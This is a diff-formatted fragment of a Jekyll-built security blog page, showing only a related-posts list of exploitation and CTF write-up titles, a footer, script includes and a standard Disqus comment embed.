+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/csaw-ctf-2015-ftp/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/csaw-ctf-2015-ftp"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
